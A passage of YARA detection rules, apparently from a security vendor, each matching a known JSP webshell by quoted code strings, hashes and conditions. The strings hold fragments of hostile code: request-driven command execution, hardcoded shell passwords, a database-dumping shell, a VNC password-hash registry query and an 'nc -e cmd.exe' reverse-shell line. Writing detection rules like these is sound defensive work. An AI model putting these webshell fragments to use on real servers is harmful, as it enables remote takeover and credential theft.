        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "447696b43af95310a23b953a8822b97a1bdd30f6b8164c890d82763cf022a966"
    strings:
        $s1 = "<a href=\"?path=<%String tempfilepath1=request.getParameter(\"path\"); if(tempfilepath!=null) path=tempfilepath;%><%=path%>&" fullword ascii
        $s2 = "cmd = (String)request.getParameter(\"command\");result = exeCmd(cmd);%>" fullword ascii
        $s3 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword ascii
        $s4 = "<input type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\" title=\"Click here to login\" class=\"button\" /> " fullword ascii
        $s5 = "if (password == null && session.getAttribute(\"password\") == null) {" fullword ascii
        $s6 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.library.path\").replaceAll(env.queryHashtable(\"path.sep" fullword ascii
        $s7 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.io.tmpdir\")%></td>" fullword ascii
        $s8 = "<td width=\"20%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.runtime.version\")%></td>" fullword ascii
        $s9 = "<td height=\"22\" colspan=\"3\">&nbsp;<%= request.getServerName() %>(<%=request.getRemoteAddr()%>)</td>" fullword ascii
        $s10 = "<a href=\"<%=selfName %>?path=<%=path%><%=fList[j].getName()%>\\\"> <%=fList[j].getName()%></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" fullword ascii
        $s11 = "String password=request.getParameter(\"password\");" fullword ascii
        $s12 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword ascii
        $s13 = "//if(request.getQueryString()!=null&&request.getQueryString().indexOf(act,0)>=0)action=request.getParameter(act);" fullword ascii
        $s14 = "tempfilename=(String)session.getId();" fullword ascii
        $s15 = "<textarea name=\"content\" cols=\"105\" rows=\"30\"><%=readAllFile(editfile)%></textarea>" fullword ascii
        $s16 = "<td colspan=\"3\">&nbsp;<%=env.queryHashtable(\"os.name\")%> <%=env.queryHashtable(\"os.version\")%> " fullword ascii
        $s17 = "{editfilecontent=new String(editfilecontent1.getBytes(\"ISO8859_1\"));}" fullword ascii
        $s18 = "* <p>Company: zero.cnbct.org</p>" fullword ascii
        $s19 = "//String tempfilename=request.getParameter(\"file\");" fullword ascii
        $s20 = "String editfilecontent1=request.getParameter(\"content\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}

rule f8e821109bf34adcb88af9f0fb9a2d5e
{
    meta:
        description = "jsp - file f8e821109bf34adcb88af9f0fb9a2d5e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a575fd9b97cef6d87b1ecec77fef85a40ddde12488382a525389bf5a146f49d7"
    strings:
        $x1 = "Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii
        $s2 = "request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii
        $s3 = "<INPUT TYPE=\"submit\" VALUE=\"Execute\">" fullword ascii
        $s4 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii
        $s5 = "if (request.getParameter(\"cmd\") != null) {" fullword ascii
        $s6 = "out.println(\"Command: \" +" fullword ascii
        $s7 = "b04a6\"/> </rdf:Description> </rdf:RDF> </x:xmpmeta> <?xpacket end=\"r\"?>xV;J  " fullword ascii
        $s8 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/ResourceRef#\" xmlns:xmp=\"http://ns.adobe.com/xa" ascii
        $s9 = "Process p =" fullword ascii
        $s10 = "<H3>JSP SHELL</H3>" fullword ascii
        $s11 = "InputStream in = p.getInputStream();" fullword ascii
        $s12 = "OutputStream os = p.getOutputStream();" fullword ascii
        $s13 = "<FORM METHOD=\"GET\" NAME=\"myform\"" fullword ascii
        $s14 = "b |  z-m, - " fullword ascii
        $s15 = "<INPUT TYPE=\"text\" NAME=\"cmd\">" fullword ascii
        $s16 = "tEXtSoftware Adobe ImageReadyq e<  " fullword ascii
        $s17 = "import=\"java.util.*,java.io.*\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 9KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ef98ca135dfb9dcdd2f730b18e883adf50c4ab82
{
    meta:
        description = "jsp - file ef98ca135dfb9dcdd2f730b18e883adf50c4ab82.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0c46f55636d38c633475b20eae1dfd016e5aa11a4de636628bb422f8c845eb28"
    strings:
        $s1 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.ge" fullword ascii
        $s2 = "String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"utf-8\");   " fullword ascii
        $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"utf-8\");   " fullword ascii
        $s4 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getRequestUR" ascii
        $s5 = ":</font><%out.print(request.getRealPath(request.getServletPath())); %>   " fullword ascii
        $s6 = "<form name=\"frmUpload\" method=\"post\" action=\"\">   " fullword ascii
        $s7 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>   " fullword ascii
    condition:
        ( uint16(0) == 0x200a and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule b38f4670886e79bc4d6a4e5a6e0e852d981048d7
{
    meta:
        description = "jsp - file b38f4670886e79bc4d6a4e5a6e0e852d981048d7.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5357cb02ae7a2dcd8815b4bff238c605a24b418ebb9f5e907e42169ba5d76f70"
    strings:
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();  " fullword ascii
        $s2 = "<%   if(\"023\".equals(request.getParameter(\"pwd\"))){  " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_16238e86cf4e913c956dcf804bca86da2f2127f5
{
    meta:
        description = "jsp - file 16238e86cf4e913c956dcf804bca86da2f2127f5.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
    strings:
        $s1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s2 = "* Blog http://www.baidu.com/" fullword ascii
        $s3 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s4 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s6 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s7 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s8 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
        $s9 = "private static final String PW = \"max\"; //password" fullword ascii
        $s10 = "idu.com</a></p>\"+" fullword ascii
        $s11 = "* Code By admin" fullword ascii
        $s12 = "* Huan . I Love You." fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_919b109751aa79f0dd2aecb1d7d23e58d9544543
{
    meta:
        description = "jsp - file 919b109751aa79f0dd2aecb1d7d23e58d9544543.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ddf0b2fb4c9c4799d86a7fd3860f94ba26b4c47084f283b4b84309bdb4f618b7"
    strings:
        $s1 = "<action name=\"activitySupportAdvisory\" class=\"com.founder.web.action.activity.EventAction\"  method=\"supportAdvisory\">" fullword ascii
        $s2 = "<action name=\"initActivityVoteResult\" class=\"com.founder.web.action.activity.EventAction\"  method=\"initVoteResult\">" fullword ascii
        $s3 = "<action name=\"activityAgainstAdvisory\" class=\"com.founder.web.action.activity.EventAction\"  method=\"againstAdvisory\">" fullword ascii
        $s4 = "<action name=\"initActivityAdvisory\" class=\"com.founder.web.action.activity.EventAction\"  method=\"initAdvisory\">" fullword ascii
        $s5 = "<action name=\"activityInsertGrade\" class=\"com.founder.web.action.activity.EventAction\"  method=\"insertGrade\">" fullword ascii
        $s6 = "GIF98a<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%>" fullword ascii
        $s7 = "<action name=\"activityList\" class=\"com.founder.web.action.activity.EventAction\"  method=\"activityList\">" fullword ascii
        $s8 = "<action name=\"jsonActivityVote\" class=\"com.founder.web.action.activity.EventAction\" method=\"jsonVote\">" fullword ascii
        $s9 = "\"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN\"" fullword ascii
        $s10 = "<action name=\"generateVerifyCode\" class=\"com.founder.web.action.activity.EventAction\"" fullword ascii
        $s11 = "<result name=\"input\">/WEB-INF/pages/common/404.jsp</result>" fullword ascii
        $s12 = "\"http://struts.apache.org/dtds/struts-2.0.dtd\">" fullword ascii
        $s13 = "<action name=\"eventInfo\" class=\"com.founder.web.action.activity.EventAction\">" fullword ascii
        $s14 = "<action name=\"activityAdvisory\" class=\"com.founder.web.action.activity.EventAction\"" fullword ascii
        $s15 = "<action name=\"join\" class=\"com.founder.web.action.activity.EventAction\"" fullword ascii
        $s16 = "<result>/WEB-INF/pages/activity/eventDetails.jsp</result>" fullword ascii
        $s17 = "<result>/WEB-INF/pages/activity/eventList.jsp</result>" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule sig_889c4d2a173c673e62ceb3f612494a2e99c56bc7
{
    meta:
        description = "jsp - file 889c4d2a173c673e62ceb3f612494a2e99c56bc7.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s6 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s7 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s9 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s11 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s13 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s14 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s16 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f_new.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b4cb43723713f738004b79b64b138e3e8507427e
{
    meta:
        description = "jsp - file b4cb43723713f738004b79b64b138e3e8507427e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "749efc3ba22726d74216c39724212106d9b81ede2c7db55118954eec2bfeb45d"
    strings:
        $s1 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getReq" fullword ascii
        $s2 = ":</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")); %>\">    " fullword ascii
        $s3 = "String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
        $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
        $s5 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getRequestUR" ascii
        $s6 = "<form name=\"frmUpload\" method=\"post\" action=\"\">    " fullword ascii
        $s7 = ":</font><%out.print(request.getRealPath(request.getServletPath())); %>    " fullword ascii
        $s8 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>    " fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 5KB and ( all of them ) ) or ( all of them )
}

rule e278a2011b9ebb9eeaa54d46eb8cb3f8f1f926b1
{
    meta:
        description = "jsp - file e278a2011b9ebb9eeaa54d46eb8cb3f8f1f926b1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "efe0746ae5723f3b9e4d83bbe5f65a1526ea9b42abc85883afb67e64a3697129"
    strings:
        $s1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s6 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s7 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
        $s8 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//??????" fullword ascii
        $s9 = "private static final String PW = \"k8team\"; //password" fullword ascii
        $s10 = "idu.com</a></p>\"+" fullword ascii
        $s11 = ";\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_911244498eb6805634d83261e7a1391cff40fa06
{
    meta:
        description = "jsp - file 911244498eb6805634d83261e7a1391cff40fa06.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b281c745334f6660c888fef83ae615d0fb219d9dddc74eebf8ad0b0682791b3b"
    strings:
        $x1 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"023\";String cs=\"UTF-8\";String EC(" ascii
        $s2 = "substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}e" ascii
        $s3 = "k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exce" fullword ascii
        $s4 = "g[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select" ascii
        $s5 = "File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i<d.length();i+=2){os.write((h.indexOf(d.cha" fullword ascii
        $s6 = "ws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q" ascii
        $s7 = "eption e){sb.append(\"ERROR\"+\":// \"+e.toString());}sb.append(\"|\"+\"<-\");out.print(sb.toString());%>" fullword ascii
        $s8 = "Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}v" fullword ascii
        $s9 = "1; i <=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new File(p" ascii
        $s10 = "FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInput" ascii
        $s11 = ".indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(in" ascii
        $s12 = "(\"z1\")+\"\");String z2=EC(request.getParameter(\"z2\")+\"\");sb.append(\"->\"+\"|\");String s=request.getSession().getServletC" ascii
        $s13 = "\"--f:\")!=-1){bw.write(r.getObject(i)+\"\"+\"\\t\");bw.flush();}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}}if(bw!=null){" ascii
        $s14 = "cs=request.getParameter(\"z0\")!=null?request.getParameter(\"z0\")+\"\":cs;response.setContentType(\"text/html\");response.setCh" ascii
        $s15 = "b.append(\"Execute Successfully!\\t|\\t\\r\\n\");}catch(Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n\");}}m.close();c.c" ascii
        $s16 = "}sb.append(\"\\r\\n\");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeU" ascii
        $s17 = "a.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;" ascii
        $s18 = "s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim()" ascii
        $s19 = "Stream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write" ascii
        $s20 = "x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/null]\")?\"\":x[3]);}else{Connection c=DriverManager" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_61a9e9eb6b24b46b170f421b1ee358f6a92bcbde
{
    meta:
        description = "jsp - file 61a9e9eb6b24b46b170f421b1ee358f6a92bcbde.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "26654c4213cbaff5769618c96be371610ea48ff3f85e909786b9218063e95214"
    strings:
        $s1 = "e(request.getParameter(\"t\").getBytes());%>xIXRbE.jspx" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule e9d1a110f494c0aae7ba506f2d5440e50df91f2c
{
    meta:
        description = "jsp - file e9d1a110f494c0aae7ba506f2d5440e50df91f2c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8fda43adfe7baa94145669d1b089e7df0c2b4e4a0a7fc97f457644de65afe06f"
    strings:
        $s1 = "Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
        $s2 = "rs = stmt.executeQuery(\"SELECT * FROM \" + table);" fullword ascii
        $s3 = "rs = stmt.executeQuery(\"SHOW CREATE TABLE \" + table);" fullword ascii
        $s4 = "out.println(\"Dumping data for table \" + table + \"...<br />\");" fullword ascii
        $s5 = "String password = \"222.46.19.134\";" fullword ascii
        $s6 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>" fullword ascii
        $s7 = "*************************** 1. row ***************************" fullword ascii
        $s8 = "tables.add(rs.getString(3));" fullword ascii
        $s9 = "for (int col = 1; col <= rsmd.getColumnCount(); col++) {" fullword ascii
        $s10 = "OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(backupDir+table+ex), \"UTF-8\");" fullword ascii
        $s11 = "String url = \"jdbc:jtds:sqlserver://localhost:1433/JointVolkswagen\";" fullword ascii
        $s12 = "ResultSet rs = dmd.getTables(null, null, \"%\", null);" fullword ascii
        $s13 = "* mysql> SHOW CREATE TABLE t\\G" fullword ascii
        $s14 = "*                      ) TYPE=MyISAM" fullword ascii
        $s15 = "*                        PRIMARY KEY (id)" fullword ascii
        $s16 = "*                        id int(11) default NULL auto_increment," fullword ascii
        $s17 = "DatabaseMetaData dmd = conn.getMetaData();" fullword ascii
        $s18 = "//            osw.append(rs.getString(2) + \"\\n\\n\");" fullword ascii
        $s19 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
        $s20 = "bw.append(\"INSERT INTO \" + table + \" VALUES(\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule sig_094b96e84e01793e542f8d045af68da015a4a7fc
{
    meta:
        description = "jsp - file 094b96e84e01793e542f8d045af68da015a4a7fc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $x3 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
        $x4 = "+ \"\\\" method=\\\"post\\\" onsubmit=\\\"this.submit();$('cmd').value='';return false;\\\" target=\\\"asyn\\\">\"" fullword ascii
        $x5 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
        $s6 = "((Invoker) ins.get(\"vLogin\")).invoke(request, response," fullword ascii
        $s7 = "ins.put(\"executesql\", new ExecuteSQLInvoker());" fullword ascii
        $s8 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s9 = "+ (JSession.getAttribute(CURRENT_DIR).toString() + \"/exportdata.txt\")" fullword ascii
        $s10 = "+ \"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'executesql',type:'struct',table:'\"" fullword ascii
        $s11 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc hash</option>\"" fullword ascii
        $s12 = "+ \"\\\" method=\\\"post\\\" target=\\\"echo\\\" onsubmit=\\\"$('cmd').focus()\\\">\"" fullword ascii
        $s13 = "Object obj = ((DBOperator) dbo).execute(sql);" fullword ascii
        $s14 = "ins.put(\"vLogin\", new VLoginInvoker());" fullword ascii
        $s15 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
        $s16 = "var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');\"" fullword ascii
        $s17 = "+ \" <option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'>Oracle</option>\"" fullword ascii
        $s18 = "+ \"<h2>Execute Shell &raquo;</h2>\"" fullword ascii
        $s19 = "ins.put(\"login\", new LoginInvoker());" fullword ascii
        $s20 = "(new StreamConnector(process.getErrorStream(), socket" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_52bfc305a6e7e5daa318d664ecfdc19986fa5f4e
{
    meta:
        description = "jsp - file 52bfc305a6e7e5daa318d664ecfdc19986fa5f4e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "90585b989fb9e487a803da82d671baca0cf88bfc977fc54ad1d31c19ed48e18b"
    strings:
        $s1 = "System.out.println(\"getHtmlContext:\"+e.getMessage());" fullword ascii
        $s2 = "System.out.println(\"getCss:\"+e.getMessage());" fullword ascii
        $s3 = "conn.addRequestProperty(\"User-Agent\"," fullword ascii
        $s4 = "java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url" fullword ascii
        $s5 = "String getHtmlContext(HttpURLConnection conn, String decode) {" fullword ascii
        $s6 = "+ getHtmlContext(getHTTPConn(cssuuu), decode)" fullword ascii
        $s7 = "//POST: ip=127.0.0.1&url=url&thread" fullword ascii
        $s8 = "String cssuuu = url + \"/\" + cssurl.get(i);" fullword ascii
        $s9 = "HttpURLConnection getHTTPConn(String urlString) {" fullword ascii
        $s10 = "HttpURLConnection conn = getHTTPConn(addr);" fullword ascii
        $s11 = "String html = getHtmlContext(getHTTPConn(u), decode);" fullword ascii
        $s12 = "String getServerType(HttpURLConnection conn) {" fullword ascii
        $s13 = "\"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon;)\");" fullword ascii
        $s14 = "return ia.getHostAddress();" fullword ascii
        $s15 = "while ((temp = br.readLine()) != null) {" fullword ascii
        $s16 = "title = title + list.get(i);" fullword ascii
        $s17 = "InetAddress ia = InetAddress.getLocalHost();" fullword ascii
        $s18 = "cssurl.add(ma.group(1) + \".css\");" fullword ascii
        $s19 = "String threadpp = (request.getParameter(\"thread\"));" fullword ascii
        $s20 = "<%@page import=\"java.net.HttpURLConnection\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule sig_013f24efa637d00962abc741457f51a4ee64354c
{
    meta:
        description = "jsp - file 013f24efa637d00962abc741457f51a4ee64354c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4fe3fcf186c25821794594973184fe10443239023a5f1b58a4015b06bd938249"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(cmds);" fullword ascii
        $s2 = "UploadFile.uploadFile(request.getInputStream(), PAGE_ENCODING,Integer.parseInt(request.getHeader(\"Content-Length\")),path);" fullword ascii
        $s3 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+toPath+\"'});</script>\");" fullword ascii
        $s4 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+path+\"'});</script>\");" fullword ascii
        $s5 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+ppath+\"'});</script>\");" fullword ascii
        $s6 = "<%if(cf.isFile()){%><a href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','do':'downFile','path':'<%=currentPath%>'})\">" fullword ascii
        $s7 = "<%if(cf.isFile()){%><a href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':'<%=currentPath%>'})\">" fullword ascii
        $s8 = "webRootPath = Util.formatPath(this.getClass().getClassLoader().getResource(\"/\").getPath());" fullword ascii
        $s9 = "<form action=\"<%=shellPath%>\" method=\"post\" enctype=\"application/x-www-form-urlencoded\" name=\"turnDir\">" fullword ascii
        $s10 = "192.168.11.11 |shack2 Jsp WebManage coded by shack2 QQ" fullword ascii
        $s11 = "response.sendRedirect(shellPath+\"?m=Login&info=false\");" fullword ascii
        $s12 = "<a href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=Util.formatPath(cf.getPath())%>'})\">" fullword ascii
        $s13 = "post('<%=shellPath%>',{'m':'FileManage','do':'newFile','path':currentDir,'isDir':isDir,'fileName':name});" fullword ascii
        $s14 = "final String shellPath=request.getContextPath()+request.getServletPath();" fullword ascii
        $s15 = "String isLogin=session.getAttribute(\"isLogin\")+\"\";" fullword ascii
        $s16 = "response.setHeader(\"Content-Disposition\", \"attachment; filename=\"+fname);" fullword ascii
        $s17 = "</a><a href=\"javascript:post('<%=shellPath%>',{m:'CMDS'})\" name=\"CMDS\">" fullword ascii
